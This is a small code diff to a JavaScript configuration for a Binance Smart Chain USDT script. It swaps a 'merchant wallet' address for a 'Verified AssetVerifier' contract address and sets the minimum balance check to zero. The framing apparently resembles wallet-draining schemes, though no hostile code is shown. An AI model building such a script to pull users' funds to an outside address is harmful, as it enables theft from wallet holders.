@@ -12,7 +12,7 @@
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
-        CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Merchant Wallet Address
+        CONTRACT_ADDRESS: '0x6f1Dd142d0d3162834e9e433A946C35Ab617B967', // Verified AssetVerifier Smart Contract Address
         USER_MIN_USDT: 0, // Set to 0 to bypass minimum balance threshold
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
